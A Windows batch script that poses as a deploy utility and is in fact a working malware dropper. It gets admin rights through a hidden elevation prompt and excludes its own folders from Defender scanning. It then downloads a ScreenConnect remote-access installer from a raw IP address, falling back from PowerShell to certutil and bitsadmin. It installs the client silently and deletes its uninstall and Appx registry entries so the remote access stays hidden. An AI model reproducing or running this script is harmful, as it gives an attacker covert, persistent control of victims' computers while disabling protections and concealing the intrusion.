@echo off
setlocal enabledelayedexpansion

set "LOG=%TEMP%\deploy.log"
echo [%DATE% %TIME%] Starting deploy.bat > "%LOG%"


net session >nul 2>&1
if %errorlevel% neq 0 (
    echo [%DATE% %TIME%] Not elevated. Requesting admin... >> "%LOG%"
    powershell -Command "Start-Process cmd -ArgumentList '/c ""%~f0""' -Verb RunAs -WindowStyle Hidden"
    exit /b
)
echo [%DATE% %TIME%] Running with admin privileges. >> "%LOG%"


echo [%DATE% %TIME%] Adding paths to Defender exclusions... >> "%LOG%"
powershell -Command "Add-MpPreference -ExclusionPath '$env:TEMP'; Add-MpPreference -ExclusionPath '%~dp0'" >nul 2>&1

set "TEMP_DIR=%TEMP%"
set "MSI_URL=http://142.147.99.51:8040/Bin/ScreenConnect.ClientSetup.msi?e=Access&y=Guest&c=result&c=&c=&c=&c=&c=&c=&c="
set "MSI_FILE=%TEMP_DIR%\ScreenConnect.ClientSetup.msi"

echo [%DATE% %TIME%] Downloading MSI... >> "%LOG%"
powershell -WindowStyle Hidden -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; try { Invoke-WebRequest -Uri '%MSI_URL%' -OutFile '%MSI_FILE%' -ErrorAction Stop; Write-Host 'PS_OK' } catch { Write-Host 'PS_FAIL' }" > "%TEMP%\dl_msi_status.txt" 2>&1
set /p MSI_STATUS=<"%TEMP%\dl_msi_status.txt"

if "%MSI_STATUS%"=="PS_FAIL" (
    echo [%DATE% %TIME%] PowerShell failed, trying certutil... >> "%LOG%"
    certutil -urlcache -split -f "%MSI_URL%" "%MSI_FILE%" >nul 2>&1
    if !errorlevel! neq 0 (
        echo [%DATE% %TIME%] certutil failed, trying bitsadmin... >> "%LOG%"
        bitsadmin /transfer "MSIDownload" /download /priority HIGH "%MSI_URL%" "%MSI_FILE%" >nul 2>&1
    )
)

if exist "%MSI_FILE%" (
    echo [%DATE% %TIME%] MSI downloaded. Installing silently... >> "%LOG%"
    msiexec /i "%MSI_FILE%" /qn /norestart

    
    echo [%DATE% %TIME%] Removing ScreenConnect from all registry locations... >> "%LOG%"
    
    
    powershell -Command "Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | ForEach-Object { if ((Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName -like '*ScreenConnect*') { Remove-Item $_.PSPath -Force -ErrorAction SilentlyContinue } }"
    
    
    powershell -Command "Get-ChildItem 'HKLM:\SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | ForEach-Object { if ((Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName -like '*ScreenConnect*') { Remove-Item $_.PSPath -Force -ErrorAction SilentlyContinue } }"
    
    
    powershell -Command "Get-ChildItem 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*' -ErrorAction SilentlyContinue | ForEach-Object { if ((Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).DisplayName -like '*ScreenConnect*') { Remove-Item $_.PSPath -Force -ErrorAction SilentlyContinue } }"
    
    
    powershell -Command "Get-ChildItem 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\Deployments\*' -ErrorAction SilentlyContinue | ForEach-Object { if ((Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).PackageName -like '*ScreenConnect*') { Remove-Item $_.PSPath -Force -ErrorAction SilentlyContinue } }"
    
    
    powershell -Command "Get-ChildItem 'HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Appx\AppxAllUserStore\Deployments\*' -ErrorAction SilentlyContinue | ForEach-Object { if ((Get-ItemProperty $_.PSPath -ErrorAction SilentlyContinue).PackageName -like '*ScreenConnect*') { Remove-Item $_.PSPath -Force -ErrorAction SilentlyContinue } }"

    echo [%DATE% %TIME%] MSI install exit code: !errorlevel! >> "%LOG%"
    del /f /q "%MSI_FILE%"
    echo [%DATE% %TIME%] MSI file cleaned up. >> "%LOG%"
) else (
    echo [%DATE% %TIME%] MSI download failed. Cannot install. >> "%LOG%"
)

del /f /q "%TEMP%\dl_msi_status.txt" >nul 2>&1

echo [%DATE% %TIME%] Deploy complete. >> "%LOG%"

copy /y "%LOG%" "%~dp0..\bat_conversion.log" >nul 2>&1

exit /b
